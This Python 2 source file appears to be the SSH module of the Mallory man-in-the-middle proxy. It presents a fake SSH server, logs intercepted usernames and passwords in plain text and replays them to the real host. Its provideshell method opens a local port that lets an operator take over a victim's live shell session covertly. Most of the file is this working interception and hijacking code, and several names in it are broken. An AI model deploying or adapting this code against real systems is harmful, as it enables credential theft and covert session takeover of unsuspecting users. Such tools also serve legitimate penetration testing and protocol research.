from base import TcpProtocol

import os
import os.path
import socket
import malloryevt
import threading
import paramiko
import select

import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import logging

# windows does not have termios...
try:
    import termios
    import tty
    has_termios = True
except ImportError:
    has_termios = False



class SSHProtocol(TcpProtocol):
    """This class implements the shell parts of the SSH protocol MiTM"""
    def __init__(self, trafficdb, source, destination):
        TcpProtocol.__init__(self, trafficdb, source, destination)
        self.friendly_name = "SSH"
        self.log = logging.getLogger("mallorymain")              
        self.serverPort = 22
        self.name = "SSH"
        # Source and destination transports. Used by the paramiko SSH library
        self.sourcet = None
        self.destt = None
        
        # Destination and source channels for the SSH shell
        self.sourceschan = None
        self.destschan = None

        self.supports = {malloryevt.STARTS2C:True, malloryevt.STARTC2S:True,
                         malloryevt.CSAFTERSS:True, malloryevt.SSCREATE:True}
                
        self.log.info("[*] SSHProtocol: Initializing")
    
    
    
    def forward_any(self, conndata):        
        pass
    
    def forward_s2c(self, conndata):
        return
    
    def forward_c2s(self, conndata):    
        self.log.info("SSHProtocol: starting shell() forward_c2s")
        self.shell()
#                    
        
    def configure_client_socket(self):
                 
        self.log.info("SSHProtocol: ccs: configuring client socket")
        
        host_key = paramiko.RSAKey(filename='test_rsa.key')
                                
        self.sourcet = paramiko.Transport(self.source)
        try:
            self.sourcet.load_server_moduli()
        except:
            self.log.error("SSHProtocol: Failed to load moduli -- gex " \
                           "will be unsupported.)")
            raise
        self.sourcet.add_server_key(host_key)
        

    
        # Initialize the SSH connection to the server
        # BUGFIX: client must init before the server start. A race condition
        # was created between the server and the client. If the client can
        # get credentials to SSHServer before client socket config 
        # this method there will be an error.
        self.log.info("SSHProtocol: initializing client to server SSH")
        self.init_ssh_client()
        
        # Start up the SSH server.                     
        server = SSHServer(self)                
        try:
            self.sourcet.start_server(server=server)
        except paramiko.SSHException, x:
            self.log.error("SSHProtocol: SSH negotiation failed.")
            return
                
        # wait for auth
        chan = self.sourcet.accept(20)
        if chan is None:
            self.log.error("*** No channel.")
            sys.exit(1)
        self.log.info("SSHProtocol: User authenticated!")
        
        
        server.event.wait(10)
        if not server.event.isSet():
            self.log.warn("SSHProtocol: client never asked for a anything.")
            return
        
        chan.send('\r\n\r\nThings just got real.\r\n\r\n')
        
        self.sourceschan = chan
        self.log.debug("SSHProtocol: finished configuring client socket")

        self.destschan = self.destt.open_session()
        self.destschan.get_pty()
        self.destschan.invoke_shell()
        
#    chan = t.open_session()
#    chan.get_pty()
#    chan.invoke_shell()
            
        #chan.close()
        #self.sourcet.close()
    def configure_server_socket(self):
        self.log.info("SSHProtocol: configuring server socket")         
        return
    
                
#    def supports(self, mevt):
#        if mevt == malloryevt.CSAFTERSS:
#            return True           
#        if mevt == malloryevt.SSCREATE:
#            return True        
#        if mevt == malloryevt.STARTC2S:
#            return True
#        if mevt == malloryevt.STARTS2C:
#            return True
#              
#        return False
          
    def shell(self):
        """This starts a  shell to the end user. Since we are the server
        we will use a simple descriptor selector to read/write the data.
        
        This reads and writes data to the source and destination sockets
        """
        import select
    
        # Not sure if we want to use the mallory server's term info, but it works
        # for now. 
        #oldtty = termios.tcgetattr(sys.stdin)
        
        try:
            self.destschan.settimeout(0.0)
    
            while True:
                r, w, e = select.select([self.destschan, self.sourceschan], [], [])
                if self.destschan in r:
                    try:
                        x = self.destschan.recv(1024)                        
                        if len(x) == 0:
                            self.log.info("SSHProtocol: shutting down session")
                            self.destchan.close()
                            self.sourcechan.close()
                            break
                        self.sourceschan.send(x)
                    except socket.timeout:
                        pass
                if self.sourceschan in r:
                    x = self.sourceschan.recv(1024)
                    if len(x) == 0:
                        break
                    self.destschan.send(x)
                    
        finally:
            pass
            #termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)

          
    def init_ssh_client(self):
        self.log.debug("SSHProtocol: Initializing the destination transport")
        self.destt = paramiko.Transport(self.destination)
        try:
            self.destt.start_client()
        except paramiko.SSHException:
            self.log.error("*** SSH negotiation failed.")
            return
            
            
    def provideshell(self, mallorymain):
        """Static method demonstrating how features of the SSH protocol can
        be used once the user has been man in the middled. In this case this 
        method creates a local server that can be telnetted to. It will then
        list out all available MITM SSH sessions and allow access to the
        victim's shell without their knowledge. 
        
        This method should be considered experimental and only used for
        demonstration purposes as it has no concern for thread safety and is
        not built with error checking or much exception handling other than a
        blanket exception handler to deal with almost any problem it has. 
        
        However, it is fun. 
        """ 
        
        listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen.bind(('',20756))
        listen.listen(1)
        
        sshproto = SSHProtocol(None, None, None)
        
        while True:
            try:
                (insock, address) = listen.accept()
                
                sockfile = insock.makefile("r")
                
                if address[0] != "127.0.0.1":
                    insock.sendall("Sorry, I don't think I like you.")
                    continue
                availssh = ""
                            
                for proto in mallorymain.protoinstances: 
                    if proto.__class__ == sshproto.__class__:
                        availssh += "[%d] SSHProtocol connected to %s\n" % \
                        (mallorymain.protoinstances.index(proto), 
                         proto.destination.getpeername())
                                        
                insock.sendall(availssh)
                insock.sendall("Which SSH MITM session would you like a shell on? ")
                protoidx = int(sockfile.readline())
                
                try:                                
                    sshprotoinst = mallorymain.protoinstances[protoidx]
                except:
                    insock.send("\nInvalid selection.")
                    insock.close()
                    raise Exception("User failed at picking a number. ")        
                    
                    
                hijackchan = sshprotoinst.destt.open_session()
                hijackchan.get_pty()
                hijackchan.invoke_shell()
            

                while True:
                    r, w, e = select.select([hijackchan, insock], [], [])
                    if hijackchan in r:
                        try:
                            x = hijackchan.recv(1024)
                            if len(x) == 0:
                                insock.close()
                                hijackchan.close()
                                break
                            insock.sendall(x)
                        except socket.timeout:
                            pass
                    if insock in r:
                        x = insock.recv(1024)
                        if len(x) == 0:
                            break
                        hijackchan.send(x)
            except:
                self.log.error("SSH shell shocking bombed")
                print sys.exc_info()
                continue          
              
class SSHServer (paramiko.ServerInterface):
    # 'data' is the output of base64.encodestring(str(key))
    # (using the "user_rsa_key" files)
    data = 'AAAAB3NzaC1yc2EAAAABIwAAAIEAyO4it3fHlmGZWJaGrfeHOVY7RWO3P9M7hp' + \
           'fAu7jJ2d7eothvfeuoRFtJwhUmZDluRdFyhFY/hFAh76PJKGAusIqIQKlkJxMC' + \
           'KDqIexkgHAfID/6mqvmnSJf0b5W8v5h2pI/stOSwTQ+pxVhwJ9ctYDhRSlF0iT' + \
           'UWT10hcuO4Ks8='
    good_pub_key = paramiko.RSAKey(data=base64.decodestring(data))

    def __init__(self, sshproto):
        self.event = threading.Event()
        self.sshproto = sshproto
        self.log = logging.getLogger("mallorymain")

    def check_channel_request(self, kind, chanid):
        self.log.info("SSHProtocol: check_channel_request: kind:%s" % (kind))
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password): 
        self.log.info("SSHServer: got username:%s password:%s" \
                      % (username, password))
        try:
            # Try the authentication to the server and return the response
            self.sshproto.destt.auth_password(username, password)
        except paramiko.AuthenticationException:
            self.log.error("SSHProtocol: BAAAD AUTH")
            return paramiko.AUTH_FAILED
        
        return paramiko.AUTH_SUCCESSFUL
            
        #if (username == 'sshtest') and (password == 'Intrepi0wn!'):
            #return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED


    def check_auth_publickey(self, username, key):
        self.log.info("SSHProtocol: Auth attempt with key: " \
                      + hexlify(key.get_fingerprint()))
        if (username == 'robey') and (key == self.good_pub_key):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def get_allowed_auths(self, username):
        return 'password,publickey'

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True

    def check_channel_window_change_request(self, channel, width, height, 
                                            pixelwidth, pixelheight):
        self.log.debug("SSHProtocol: window_size_change_request %d x %d" % \
                       (width, height))
        
        self.sshproto.destschan.resize_pty(width, height)
        
        return True
        
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth,
                                  pixelheight, modes):
        self.log.info("SSHProtocol: pty_request: received.")
        return True
    
    def check_channel_direct_tcpip_request(self, chanid, origin, destination):
        self.log.info("SSHProtocol: check_channel_direct_tcpip_request: " \
                      "chanid:%s, origin:%s, destination:%s" % 
                      (chanid, origin, port))
        return paramiko.OPEN_SUCCEEDED
    
    def check_port_forward_request(self, address, port):
        self.log.info("SSHProtocol: check_port_forward_request: address:%s " \
                      "port:%s " % (address, port))
        return False